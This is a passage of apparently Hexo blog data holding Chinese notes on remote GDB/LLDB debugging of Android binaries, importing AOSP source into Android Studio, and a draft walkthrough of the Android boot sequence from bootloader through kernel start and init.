设置断点<br>continue                  # 运行程序</p>\n<p>⸻</p>\n<p>✅ 交互调试中支持：<br>    •    next / step：逐句调试<br>    •    print var：打印变量<br>    •    info registers：查看寄存器<br>    •    手动输入 1\\n、2\\n：程序会接收到（stdin 有效）</p>\n<p>⸻</p>\n<p>⚠️ 注意事项</p>\n<p>问题    原因<br>连接后立刻断开    架构不匹配，请确保是 aarch64，不要设为 arm<br>Reply contains invalid hex digit    使用的是不兼容版本的 GDB 或 gdbserver，请用 NDK 中的版本<br>传参不生效    必须在 Android 上执行 gdbserver 时传参，不能在 GDB 启动命令中传参<br>无法交互输入    如果你不是用 gdbserver 启动程序而是 attach 的方式，stdin 可能无效</p>\n<p>⸻</p>\n<p>📎 一键脚本模板（可选）</p>\n<p>#!/bin/bash<br>adb push pwn_uaf1 /data/local/tmp/<br>adb shell chmod +x /data/local/tmp/pwn_uaf1<br>adb forward tcp:1234 tcp:1234<br>adb shell “cd /data/local/tmp &amp;&amp; ./gdbserver64 :1234 ./pwn_uaf1 arg1 arg2” &amp;<br>sleep 2<br>gdb-multiarch pwn_uaf1 -ex “target remote :1234”</p>\n<p>⸻</p>\n<p>是否还需要我附带一个 .gdbinit 模板来自动设置符号、连接和断点？</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>Android Studio导入源码相关<br>1、编译<br>source lunch<br> mmm development/tools/idegen/<br>sh ./development/tools/idegen/idegen.sh<br>生成的产物有android.ipr , android.iml</p>\n<p>2、使用Android Studio打开android.ipr之前的配置</p>\n<p>可更改下文件权限，chmod 777等<br>adnroid.ipr: Android Studio打开选择此文件</p>\n<p>android.iml: 用来描述modules，一般只看framework相关代码，可将其他无用modules exclude掉，减少index时间</p>\n<p>在android.iml中加入excludeFolder  exclude_modules</p>\n<p>3、配置SDKs<br>通过右击project的 根节点，选择“open module settings”打开</p>\n<p>先Java SDK（删除class path），再Android API（删除source path）<br><img src=\"../pic/javasdk.png\" alt=\"alt text\"></p>\n<p>4、删除不必要的依赖</p>\n<p>只保留<Module source>和Android API Platform即可<br><img src=\"../pic/module_source.png\" alt=\"alt text\"><br>5、可将framebases目录添加为目录依赖，如上图</p>\n<p>注意，frameworks 要在Module Source上面，要不然代码可能会跳到生成目录的文件里</p>\n<p>6、在Project视图中点击设置按钮，取消勾选Show Exclude Files</p>\n<p>7、导航条中 File→ Settings → Version Control 中删除不必要的目录管理，保留fw和 fw</p>\n<h2 id=\"android-bp讲解\"><a href=\"#android-bp讲解\" class=\"headerlink\" title=\"android.bp讲解\"></a>android.bp讲解</h2><p><a href=\"https://gityuan.com/2018/06/02/android-bp/\">https://gityuan.com/2018/06/02/android-bp/</a></p>\n<p>源码调试：<br><a href=\"https://www.cnblogs.com/yongfengnice/p/18246075\">https://www.cnblogs.com/yongfengnice/p/18246075</a></p>\n<p>打开文件/etc/sysctl.conf，在这个文件加入一行：</p>\n<p>fs.inotify.max_user_watches=524288<br>保存文件后执行：</p>\n<p>sudo sysctl -p</p>\n<p>最后可以执行：</p>\n<p>cat /proc/sys/fs/inotify/max_user_watches</p>\n<p>来检查这个值是否被成功修改了。<br>2 增加Android Studio的堆内存<br>使用Android Studio浏览这么大的项目会存在堆内存不够的问题。</p>\n<p>在Android Studio中点击File → Settings → Appearance &amp; Behavior → System Settings → Memory Settings，将其中所有heap size调到最大然后点击ok。<br>3 编译idegen模块<br>cd 源码目录</p>\n<p>source build/envsetup.sh</p>\n<p>lunch 机型名-userdebug</p>\n<p>如果没有编译过任何模块：</p>\n<p>make idegen -j12</p>\n<p>或</p>\n<p>mmm development/tools/idegen -j12</p>\n<p>如果编译过任何模块（参考增量编译单个模块）：</p>\n<p>ninjabuild idegen -j12<br>4 生成android.ipr和android.iml文件<br>编译完成后执行：</p>\n<p>./development/tools/idegen/idegen.sh</p>\n<p>执行完成可以看到在源码目录出现了android.ipr和android.iml文件</p>\n<p>android.iml文件中包括了太多的源码目录和jar包，如果此时直接用Android Studio打开ipr文件，扫描会非常耗时。通常如果只看framework层代码，只需要扫描framewroks, miui, packages, tools这几个目录就够了，并且jar包也是完全不需要的。而直接手动修改android.iml文件又十分麻烦，因此我写了一个python脚本来处理。<br>执行完成后即完成了对android.iml文件的删减，在我的Ubuntu主机上实测可以将后面的3个小时扫描时间缩短到10分钟。</p>\n<p>最近经常碰到执行idegen.sh脚本卡死的情况，目前的解决方案是按ctrl+c取消执行脚本，然后将其它项目的android.ipr和android.iml文件复制到源码目录使用即可，这里提供一份已经完成裁剪的android.ipr和android.iml文件：<br>5 用Android Studio打开项目<br>在Android Studio中点File → Open选择刚刚生成的android.ipr文件；</p>\n<p>等待右下角的文件扫描任务完成就可以看代码并且可以有代码跳转了。</p>\n<p>如果你之前没有执行过cutiml.py脚本，此时代码跳转会跳到.class文件里面而不是.java文件中，修复方法：</p>\n<p>点击File → Project Structure… → Modules → Dependencies将这里面的jar包全部删除然后点击OK。</p>\n<p>6 调试安卓源码<br>在Android Studio中点File → Project Structure… → Project → Project SDK选择Android API XX Platform，其中XX与你的安卓版本一致，例如R版本就是30。（如果在这里没有选择Android SDK会导致Android Studio中不显示连接的设备）</p>\n<p>调试方法：</p>\n<p>1 插入手机并打开USB调试；</p>\n<p>2 在需要调试的代码中打断点；</p>\n<p>3 点击Attach Debugger to Android Process看到Choose Process对话框出现；（点击按钮没反应不出现对话框的修复方法：点击Add Configuration…然后点击左上角的+，选择Android App并点击OK）</p>\n<p>4 勾选Show all processes；</p>\n<p>5 选择要调试的进程然后点击OK即可开始调试。（注：这里system_process就是SystemServer进程）</p>\n<p><a href=\"https://juejin.cn/post/7139773823116640263\">https://juejin.cn/post/7139773823116640263</a></p>\n<h2 id=\"lldb-调试servicemanager\"><a href=\"#lldb-调试servicemanager\" class=\"headerlink\" title=\"lldb 调试servicemanager\"></a>lldb 调试servicemanager</h2><p>在Android Studio中，你可以使用LLDB调试器来调试ServiceManager。以下是一些步骤和注意事项：<br>设备</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ adb push lldb-server /data/local/tmp/</span><br><span class=\"line\">$ adb shell </span><br><span class=\"line\">$ cd /data/local/tmp</span><br><span class=\"line\">$ chmod 755 lldb-server</span><br><span class=\"line\">$ ./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock</span><br></pre></td></tr></table></figure>\n<p>lldb</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(lldb) platform select remote-android </span><br><span class=\"line\">(lldb) platform connect unix-abstract-connect:///data/local/tmp/debug.sock</span><br><span class=\"line\">(lldb) file out/target/product/marlin/symbols/system/bin/servicemanager</span><br><span class=\"line\"></span><br><span class=\"line\">(lldb) target modules search-paths add /system /home/nuoen/aosp/out/target/product/marlin/symbols/system</span><br><span class=\"line\">(lldb) process attach --pid 477</span><br></pre></td></tr></table></figure>\n<p>启动<br>(lldb) process launch –stdin /dev/stdin –working-dir /data/local/tmp</p>\n<h2 id=\"gdb-调试\"><a href=\"#gdb-调试\" class=\"headerlink\" title=\"gdb 调试\"></a>gdb 调试</h2><p>当然可以，以下是一个适用于你的环境的 GDB 远程调试 Android 64 位程序（如 pwn_uaf1）的完整流程文档，支持传递参数、查看符号和断点调试。</p>\n<p>⸻</p>\n<p>📘 GDB 远程调试 Android 64-bit 程序完整流程文档</p>\n<p>🧾 前提要求<br>    •    Android 设备已 root<br>    •    已将编译好的 pwn_uaf1 推送到 /data/local/tmp/<br>    •    使用的是 64 位 ARM ELF（aarch64）<br>    •    主机安装了 gdb-multiarch，或使用 Android NDK 提供的 aarch64-linux-android-gdb<br>    •    主机与 Android 可使用 adb 通信</p>\n<p>⸻</p>\n<p>🧱 文件结构假设</p>\n<p>~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1           # 主机上的可执行文件（带符号）<br>/data/local/tmp/pwn_uaf1                             # 推送到 Android 上执行的 ELF</p>\n<p>⸻</p>\n<p>🧰 步骤一：推送目标程序到 Android</p>\n<p>adb push ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1 /data/local/tmp/<br>adb shell chmod +x /data/local/tmp/pwn_uaf1</p>\n<p>⸻</p>\n<p>🧰 步骤二：在 Android 上启动 gdbserver（带参数）</p>\n<p>adb shell<br>cd /data/local/tmp<br>./gdbserver64 :1234 ./pwn_uaf1 1 test_input.txt</p>\n<pre><code>•    :1234 是监听端口\n•    1 test_input.txt 是程序所需参数\n</code></pre>\n<p>✅ 输出应该看到：</p>\n<p>Process ./pwn_uaf1 created; pid = xxxx<br>Listening on port 1234</p>\n<p>⸻</p>\n<p>🧰 步骤三：主机上设置端口转发</p>\n<p>adb forward tcp:1234 tcp:1234</p>\n<p>⸻</p>\n<p>🧰 步骤四：启动 GDB 并连接到目标</p>\n<p>方法 A：使用系统安装的 gdb-multiarch（适合 Ubuntu）</p>\n<p>gdb-multiarch ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1</p>\n<p>方法 B：使用 Android NDK 自带 GDB（推荐）</p>\n<p>cd $NDK/toolchains/llvm/prebuilt/linux-x86_64/aarch64-linux-android/debugger-bin<br>./aarch64-linux-android-gdb ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1</p>\n<p>⸻</p>\n<p>🧰 步骤五：在 GDB 内连接并调试</p>\n<p>target remote :1234       # 连接设备<br>file ~/linux-6.7.12/LinuxLearn/exp/uaf/pwn_uaf1  # 加载符号<br>break main                # 设置断点<br>continue                  # 运行程序</p>\n<p>⸻</p>\n<p>✅ 交互调试中支持：<br>    •    next / step：逐句调试<br>    •    print var：打印变量<br>    •    info registers：查看寄存器<br>    •    手动输入 1\\n、2\\n：程序会接收到（stdin 有效）</p>\n<p>⸻</p>\n<p>⚠️ 注意事项</p>\n<p>问题    原因<br>连接后立刻断开    架构不匹配，请确保是 aarch64，不要设为 arm<br>Reply contains invalid hex digit    使用的是不兼容版本的 GDB 或 gdbserver，请用 NDK 中的版本<br>传参不生效    必须在 Android 上执行 gdbserver 时传参，不能在 GDB 启动命令中传参<br>无法交互输入    如果你不是用 gdbserver 启动程序而是 attach 的方式，stdin 可能无效</p>\n<p>⸻</p>\n<p>📎 一键脚本模板（可选）</p>\n<p>#!/bin/bash<br>adb push pwn_uaf1 /data/local/tmp/<br>adb shell chmod +x /data/local/tmp/pwn_uaf1<br>adb forward tcp:1234 tcp:1234<br>adb shell “cd /data/local/tmp &amp;&amp; ./gdbserver64 :1234 ./pwn_uaf1 arg1 arg2” &amp;<br>sleep 2<br>gdb-multiarch pwn_uaf1 -ex “target remote :1234”</p>\n<p>⸻</p>\n<p>是否还需要我附带一个 .gdbinit 模板来自动设置符号、连接和断点？</p>\n"},{"_content":"# Android 启动流程 \n\nidle 进程 优先级\n生成  1 进程init \n生成 2 进程 system_server\n\n\n基于android 10来分析\n\n## Boot ROM\n当按下电源键，硬件上电之后，会有一个固定的内存区域读取程序，这个程序是烧写到硬件上的ROM,用于将bootloader加载到RAM中，并开始执行它。\n\n## bootloader\nbootloader用于告诉设备如何找到系统内核，和启动内核。\n手机厂商一般会在bootloader中加上密钥锁和一些限制.\nbootloader执行一般分为两个阶段:\n* 1. 检测外部RAM内存,并加载一段bootloader代码用于第二阶段的执行\n* 2. 设置运行内核所需要的网络和内存等\n高通芯片提供的LK,就可以作为一个Android的bootloader.\n常见的bootloader有:\n* U-boot\n* LK\n\n## kernel\nAndroid使用的linux kernel,当kernel启动时,会执行一系列的初始化操作,比如设置缓存,内存,加载驱动程序,挂载根文件系统,初始化输入输出等.\n当内核启动完成之后,第一件要做的事就是在系统文件中找一个“init”,作为根进程或者第一个系统进程.\n看一下linux kernel的源码,找一个arm64架构开始分析:\n\n入口在```arch/arm64/kernel/head.S```\n```S\n\n * Kernel startup entry point.\n * ---------------------------\n *\n * The requirements are:\n *   MMU = off, D-cache = off, I-cache = on or off,\n *   x0 = physical address to the FDT blob.\n *\n * Note that the callee-saved registers are used for storing variables\n * that are useful before the MMU is enabled. The allocations are described\n * in the entry routines.\n */\n\t__HEAD\n\t/*\n\t * DO NOT MODIFY. Image header expected by Linux boot-loaders.\n\t */\n\tefi_signature_nop\t\t\t// special NOP to identity as PE/COFF executable \n\tb\tprimary_entry\t\t\t// branch to kernel start, magic 开始跳转到内核入口\n\t.quad\t0\t\t\t\t// Image load offset from start of RAM, little-endian\n\tle64sym\t_kernel_size_le\t\t\t// Effective size of kernel image, little-endian\n\tle64sym\t_kernel_flags_le\t\t// Informative flags, little-endian\n\t.quad\t0\t\t\t\t// reserved\n\t.quad\t0\t\t\t\t// reserved\n\t.quad\t0\t\t\t\t// reserved\n\t.ascii\tARM64_IMAGE_MAGIC\t\t// Magic number\n\t.long\t.Lpe_header_offset\t\t// Offset to the PE header.\n\n\t__EFI_PE_HEADER\n\n\t.section \".idmap.text\",\"a\"\n\n\t/*\n\t * The following callee saved general purpose registers are used on the\n\t * primary lowlevel boot path:\n\t *\n\t *  Register   Scope                      Purpose\n\t *  x19        primary_entry() .. start_kernel()        whether we entered with the MMU on\n\t *  x20        primary_entry() .. __primary_switch()    CPU boot mode\n\t *  x21        primary_entry() .. start_kernel()        FDT pointer passed at boot in x0\n\t *  x22        create_idmap() .. start_kernel()         ID map VA of the DT blob\n\t *  x23        primary_entry() .. start_kernel()        physical misalignment/KASLR offset\n\t *  x24        __primary_switch()                       linear map KASLR seed\n\t *  x25        primary_entry() .. start_kernel()        supported VA size\n\t *  x28        create_idmap()                           callee preserved temp register\n\t */\n\nSYM_CODE_START(primary_entry) // 是代码的启动入口，这个函数负责在内核启动之前的各种配置\n\tbl\trecord_mmu_state  //记录当前 MMU 状态。它读取寄存器 SCTLR_EL1（在 EL1 模式下）或 SCTLR_EL2（在 EL2 模式下）的值，以确定 MMU、缓存等设置是否已开启。\n\tbl\tpreserve_boot_args //保存启动参数，以便后续阶段使用。\n\tbl\tcreate_idmap //创建恒等映射（identity mapping），即物理地址和虚拟地址一一对应的映射，以确保在 MMU 关闭的情况下代码可以执行。\n\n\t/*\n\t * If we entered with the MMU and caches on, clean the ID mapped part\n\t * of the primary boot code to the PoC so we can safely execute it with\n\t * the MMU off.\n\t */\n\tcbz\tx19, 0f\n\tadrp\tx0, __idmap_text_start\n\tadr_l\tx1, __idmap_text_end\n\tadr_l\tx2, dcache_clean_poc\n\tblr\tx2\n0:\tmov\tx0, x19\n\tbl\tinit_kernel_el\t\t\t// w0=cpu_boot_mode\n\tmov\tx20, x0\n\n\t/*\n\t * The following calls CPU setup code, see arch/arm64/mm/proc.S for\n\t * details.\n\t * On return, the CPU will be ready for the MMU to be turned on and\n\t * the TCR will have been set.\n\t */\n#if VA_BITS > 48\n\tmrs_s\tx0, SYS_ID_AA64MMFR2_EL1\n\ttst\tx0, ID_AA64MMFR2_EL1_VARange_MASK\n\tmov\tx0, #VA_BITS\n\tmov\tx25, #VA_BITS_MIN\n\tcsel\tx25, x25, x0, eq\n\tmov\tx0, x25\n#endif\n\tbl\t__cpu_setup\t\t\t// initialise processor\n\tb\t__primary_switch\nSYM_CODE_END(primary_entry)\n\n```\nSYM_CODE_START(primary_entry) 宏解析\n```s\n#define ASM_NL ;\n#define SYM_L_GLOBAL(name) .globl name\n\n#define SYM_CODE_START(name) \\\n\tSYM_START(name, SYM_L_GLOBAL , SYM_A_ALIGN)\n\n#define SYM_START(name, linkage, align...) \\\n\tSYM_ENTRY(name,linkage,align)\n\n#define SYM_ENTRY(name,linkage,align...) \\\n\tlinkage(name) ASM_NL \\\n\talign ASM_NL \\\n\tname:\n#解析为:\n.globl primary_entry;\n.balign 4; \nprimary_entry:\n```\n```S\nSYM_FUNC_START_LOCAL(__primary_switch)\n\t...\n\tldr\tx8, =__primary_switched\n\tadrp\tx0, KERNEL_START\t\t// __pa(KERNEL_START)\n\tbr\tx8\n\t...\nSYM_FUNC_END(__primary_switch)\n\n/*\n * The following fragment of code is executed with the MMU enabled.\n *\n *   x0 = __pa(KERNEL_START)\n */\nSYM_FUNC_START_LOCAL(__primary_switched)\n\tadr_l\tx4, init_task\n\t...\n\tmov\tx0, x20\n\tbl\tfinalise_el2\t\t\t// Prefer VHE if possible\n\tldp\tx29, x30, [sp], #16\n\tbl\tstart_kernel\n\tASM_BUG()\nSYM_FUNC_END(__primary_switched)\n```\n初始化会执行到__primary_switched,再执行start_kernel,start_kernel是内核C代码的入口\n这个时候“0号”进程“swapper”(一个Idle进程)已经启动了(init_task.c中调用).\n* 启动内核\n```c\n// 声明：inlude/linux/start_kernel.h\nextern asmlinkage void __init __noreturn start_kernel(void);\n/*\nasmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。\n\t•\t作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。\n\n在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。*/\n\n//实现：init/main.c\n\nvoid start_kernel(void){\n\t...\n\tarch_call_rest_init();\n\t...\n}\n\n\nvoid __init __weak __noreturn arch_call_rest_init(void){\n\trest_init();\n}\n/**\nrest_init 函数的职责包括：\n\n\t1.\t启动 init 进程，使其获得 PID 1。\n\t2.\t启动 kthreadd 内核线程管理进程，负责管理所有的内核线程。\n\t3.\t将系统状态设置为 SYSTEM_SCHEDULING，表明系统已经完成启动并准备好调度。\n\t4.\t最终将 CPU 置于空闲状态。\n*/\n\nnoinline void _ref __noreturn rest_init(void){\n\tint pid;\n\n\tpid = user_mode_thread(kernel_init,NULL,CLONE_FS);\n}\n/**\nuser_mode_thread 通过创建一个新的线程并切换到用户模式，完成了从内核空间向用户空间的过渡。这个过程需要配置和设置特定的寄存器、栈以及状态，以确保新线程可以在用户模式下正常运行。\n1.\tinit 进程必须是用户态进程：\n\t•\t在 Linux 系统中，init 进程（PID 1）是第一个用户态进程。所有用户态进程都是直接或间接从 init 派生的。\n\t•\tinit 进程通常负责启动用户空间的初始化脚本和守护进程，建立用户空间环境。因此，init 必须以用户态运行。\n2.\tkernel_init 的任务是启动用户空间应用：\n\t•\tkernel_init 函数的作用是完成一些内核启动后的收尾工作，然后启动用户态的 /sbin/init 或者其他指定的初始化程序，以此开始加载用户态进程和服务。\n\t•\t通过 user_mode_thread 进入用户模式执行 kernel_init，使得它可以顺利地过渡到用户空间，并启动用户态程序。\t\n3.\t安全性和隔离性：\n\t•\t将 kernel_init 放在用户模式运行可以将其与内核空间隔离。这种设计符合 Linux 内核的安全模型，使用户空间和内核空间隔离，避免了对内核资源的意外或恶意操作。\n\t•\t用户态进程的错误（如非法访问内存）不会影响到内核本身的稳定性，而是被限制在用户空间。\n4.\t切换到用户态是 Linux 启动流程的必要步骤：\n\t•\tLinux 的启动流程分为内核初始化和用户空间初始化两个主要阶段。rest_init 调用 user_mode_thread 生成一个用户态进程，这标志着内核的初始化阶段已经完成，系统从内核态过渡到用户态。\n\t•\t这一步完成后，内核将主要作为用户空间进程的支持系统，不会主动执行其他任务，除非通过系统调用、异常或中断进入内核。\n*/\n\n/**kernel_init 函数的主要目标是执行用户空间的 init 程序（通常是 /sbin/init），从而让系统进入多用户操作模式，并为用户空间进程提供运行环境。*/\nstatic int __ref kernel_init(void *unused){\n\tint ret;\n\n\t/*\n\t * Wait until kthreadd is all set-up.\n\t•\twait_for_completion 等待 kthreadd（内核线程管理进程）完成初始化，确保在内核线程管理机制准备好之前不会继续执行。\n\t•\t这是启动用户空间进程的前提条件，因为用户态的进程可能需要创建内核线程，而 kthreadd 管理所有内核线程的创建。\n\t */\n\twait_for_completion(&kthreadd_done);\n\n\t/**\n\t•\tkernel_init_freeable 负责完成一些可以在内核空间中释放的初始化任务。这些任务包括加载设备驱动程序、设置文件系统等。\n\t•\t此时系统仍处于内核态，确保内核态初始化完整后再释放内存。\n\t*/\n\tkernel_init_freeable();\n\t/* need to finish all async __init code before freeing the memory \n\t•\tasync_synchronize_full() 确保所有的异步初始化操作都已完成。\n\t•\t设置 system_state 为 SYSTEM_FREEING_INITMEM，表明系统已经准备好释放初始化用的内存。\n\t•\t调用一系列函数（如 kprobe_free_init_mem、ftrace_free_init_mem 等）释放内核初始化过程中分配的内存。\n\t•\tfree_initmem() 释放 .init 段的内存，这部分内存仅用于启动时的内核态初始化，初始化完成后便不再需要，因此可以释放。\n\t•\tmark_readonly() 将某些内核代码段设置为只读，以增强系统的安全性\n\t*/\n\tasync_synchronize_full();\n\n\tsystem_state = SYSTEM_FREEING_INITMEM;\n\tkprobe_free_init_mem();\n\tftrace_free_init_mem();\n\tkgdb_free_init_mem();\n\texit_boot_config();\n\tfree_initmem();\n\tmark_readonly();\n\n\t/*\n\t * Kernel mappings are now finalized - update the userspace page-table\n\t * to finalize PTI.\n\t */\n\tpti_finalize();\n\n\t/**\n\t•\t将系统状态设置为 SYSTEM_RUNNING，表示系统已经完成内核态的初始化，可以正常运行。\n\t•\t设置默认的 NUMA（非一致性内存访问）策略。\n\t•\t调用 rcu_end_inkernel_boot() 结束 RCU 的启动状态，进入正常的 RCU 调度状态。\n\t*/\n\tsystem_state = SYSTEM_RUNNING;\n\tnuma_default_policy();\n\n\trcu_end_inkernel_boot();\n\t/**\n\t•\tdo_sysctl_args() 解析启动时传入的系统控制参数（sysctl arguments），并应用这些参数。\n\t*/\n\tdo_sysctl_args();\n\t/**\n\t内核接下来会尝试启动 init 进程，进入用户空间，并完成从内核态到用户态的过渡。它会按顺序检查不同的命令，直到成功启动一个 init 程序。\n\t*/\n\tif (ramdisk_execute_command) {\n\t\tret = run_init_process(ramdisk_execute_command);\n\t\tif (!ret)\n\t\t\treturn 0;\n\t\tpr_err(\"Failed to execute %s (error %d)\\n\",\n\t\t       ramdisk_execute_command, ret);\n\t}\n\n\t/*\n\t * We try each of these until one succeeds.\n\t *\n\t * The Bourne shell can be used instead of init if we are\n\t * trying to recover a really broken machine.\n\t */\n\tif (execute_command) {\n\t\tret = run_init_process(execute_command);\n\t\tif (!ret)\n\t\t\treturn 0;\n\t\tpanic(\"Requested init %s failed (error %d).\",\n\t\t      execute_command, ret);\n\t}\n\n\tif (CONFIG_DEFAULT_INIT[0] != '\\0') {\n\t\tret = run_init_process(CONFIG_DEFAULT_INIT);\n\t\tif (ret)\n\t\t\tpr_err(\"Default init %s failed (error %d)\\n\",\n\t\t\t       CONFIG_DEFAULT_INIT, ret);\n\t\telse\n\t\t\treturn 0;\n\t}\n\n\tif (!try_to_run_init_process(\"/sbin/init\") ||\n\t    !try_to_run_init_process(\"/etc/init\") ||\n\t    !try_to_run_init_process(\"/bin/init\") ||\n\t    !try_to_run_init_process(\"/bin/sh\"))\n\t\treturn 0;\n\n\tpanic(\"No working init found.  Try passing init= option to kernel. \"\n\t      \"See Linux Documentation/admin-guide/init.rst for guidance.\");\n}\n内核态到用户态的过渡\n\n\t1.\t启动 init 进程：内核首先在内核态完成各项初始化工作，创建并执行 init 进程。\n\t2.\t执行用户空间的 init 程序：init 程序成功启动后，系统将从内核态过渡到用户态。此时，init 成为用户空间中第一个进程，接管系统控制权。\n\t3.\t进入用户空间：执行 execve（或类似的系统调用）将用户空间的 init 程序加载到内存中，内核清除旧的内存映射并建立用户空间的内存映射，完成从内核态到用户态的过渡。\n\t4.\t系统进入正常运行：一旦 init 进程运行，系统便进入多用户模式，可以运行用户应用程序和守护进程。\n\nkernel_init:\n\t•\tkernel_init 函数完成内核态的初始化任务并最终启动 init 进程。\n\t•\t内核通过逐步释放内存、更新系统状态等操作，为进入用户态做好准备。\n\t•\t当 init 程序启动成功，系统完成从内核态到用户态的过渡，内核初始化阶段结束，用户空间的系统管理程序正式接管控制权。\n\n```\n## init\n源码：```system/core/init/main.cpp```\n进程位置：```/system/core/init```\n\n```cpp\nint main(int argc, char** argv) {\n#if __has_feature(address_sanitizer)\n    __asan_set_error_report_callback(AsanReportCallback);\n#endif\n\n    if (!strcmp(basename(argv[0]), \"ueventd\")) {\n        return ueventd_main(argc, argv);\n    }\n\n    if (argc > 1) {\n        if (!strcmp(argv[1], \"subcontext\")) {\n            android::base::InitLogging(argv, &android::base::KernelLogger);\n            const BuiltinFunctionMap function_map;\n\n            return SubcontextMain(argc, argv, &function_map);\n        }\n\n        if (!strcmp(argv[1], \"selinux_setup\")) {\n            return SetupSelinux(argv);\n        }\n\n        if (!strcmp(argv[1], \"second_stage\")) {\n            return SecondStageMain(argc, argv);\n        }\n    }\n\n    return FirstStageMain(argc, argv);\n}\n```\nFirstStageMain\n```cpp\nint FirstStageMain(int argc, char** argv) {\n\tstd::vector<std::pair<std::string, int>> errors;\n\t#define CHECKCALL(x) \\\n    if (x != 0) errors.emplace_back(#x \" failed\", errno);\n\t/**\n\t•\t#x：# 是预处理操作符，将参数 x 转换为字符串字面量。例如，如果 x 是 open(\"/some/file\")，那么 #x 会被替换为字符串 \"open(\\\"/some/file\\\")\"。\n\t•\t#x \" failed\"：会生成类似 \"open(\\\"/some/file\\\") failed\" 的字符串，表示 x 的调用失败。\n\t•\terrno：一个全局变量，通常用来存储最近一次系统调用或库函数的错误代码。errno 的值在发生错误时会被相应函数设置成错误代码，以便诊断错误原因。\n\t*/\n    CHECKCALL(clearenv());\n    CHECKCALL(setenv(\"PATH\", _PATH_DEFPATH, 1));\n\n    const char* path = \"/system/bin/init\";\n    const char* args[] = {path, \"selinux_setup\", nullptr};\n    execv(path, const_cast<char**>(args));\n}\n```\n执行```/system/bin/init selinux_setup```\nSetupSelinux\n```cpp\nint SetupSelinux(char** argv) {\n    InitKernelLogging(argv);\n\n    if (REBOOT_BOOTLOADER_ON_PANIC) {\n        InstallRebootSignalHandlers();\n    }\n\n    // Set up SELinux, loading the SELinux policy.\n    SelinuxSetupKernelLogging();\n    SelinuxInitialize();\n\n    // We're in the kernel domain and want to transition to the init domain.  File systems that\n    // store SELabels in their xattrs, such as ext4 do not need an explicit restorecon here,\n    // but other file systems do.  In particular, this is needed for ramdisks such as the\n    // recovery image for A/B devices.\n    if (selinux_android_restorecon(\"/system/bin/init\", 0) == -1) {\n        PLOG(FATAL) << \"restorecon failed of /system/bin/init failed\";\n    }\n\n    const char* path = \"/system/bin/init\";\n    const char* args[] = {path, \"second_stage\", nullptr};\n    execv(path, const_cast<char**>(args));\n\n    // execv() only returns if an error happened, in which case we\n    // panic and never return from this function.\n    PLOG(FATAL) << \"execv(\\\"\" << path << \"\\\") failed\";\n\n    return 1;\n}\n```\n执行```/system/bin/init second_stage```\nSecondStageMain\n```cpp\n\nint SecondStageMain(int argc, char** argv) {\n\n    Epoll epoll;\n    if (auto result = epoll.Open(); !result) {\n        PLOG(FATAL) << result.error();\n    }\n\tInstallSignalFdHandler(&epoll);\n\n\t\n\tActionManager& am = ActionManager::GetInstance();\n    ServiceList& sm = ServiceList::GetInstance();\n\t//加载启动脚本\n    LoadBootScripts(am, sm);\n\n\twhile (true) {}\n}\n```\n### 一、概述\ninit进程是Linux系统中用户空间的第一个进程，进程号固定为1。Kernel启动后，在用户空间启动init进程，并调用init中的main()方法执行init进程的职责。对于init进程的功能为：\n * 挂载(mount) /sys, /dev 或者/proc等文件\n * 解析并运行所有的init.rc相关文件\n * 根据rc文件，生成相应的设备驱动节点\n * 处理子进程的终止(signal方式)\n * 提供属性服务的功能\n\n\n### 解析启动脚本\n\n```c\nstatic void LoadBootScripts(ActionManager& action_manager, ServiceList& service_list) {\n    Parser parser = CreateParser(action_manager, service_list);\n\n    std::string bootscript = GetProperty(\"ro.boot.init_rc\", \"\");\n    if (bootscript.empty()) {\n        parser.ParseConfig(\"/init.rc\");\n        if (!parser.ParseConfig(\"/system/etc/init\")) {\n            late_import_paths.emplace_back(\"/system/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/product/etc/init\")) {\n            late_import_paths.emplace_back(\"/product/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/product_services/etc/init\")) {\n            late_import_paths.emplace_back(\"/product_services/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/odm/etc/init\")) {\n            late_import_paths.emplace_back(\"/odm/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/vendor/etc/init\")) {\n            late_import_paths.emplace_back(\"/vendor/etc/init\");\n        }\n    } else {\n        parser.ParseConfig(bootscript);\n    }\n}\n```\n\n\n\n\n### 启动解析的服务\n\n### 守护解析的服务\n\n### 启动java虚拟机\n\n### 预加载资源\n\n### 循环等待孵化进程\n\n### 启动SystemServer 进程\n\n### 创建SystemServer\n\n### 管理SystemServer","source":"_drafts/android_init.md","raw":"# Android 启动流程 \n\nidle 进程 优先级\n生成  1 进程init \n生成 2 进程 system_server\n\n\n基于android 10来分析\n\n## Boot ROM\n当按下电源键，硬件上电之后，会有一个固定的内存区域读取程序，这个程序是烧写到硬件上的ROM,用于将bootloader加载到RAM中，并开始执行它。\n\n## bootloader\nbootloader用于告诉设备如何找到系统内核，和启动内核。\n手机厂商一般会在bootloader中加上密钥锁和一些限制.\nbootloader执行一般分为两个阶段:\n* 1. 检测外部RAM内存,并加载一段bootloader代码用于第二阶段的执行\n* 2. 设置运行内核所需要的网络和内存等\n高通芯片提供的LK,就可以作为一个Android的bootloader.\n常见的bootloader有:\n* 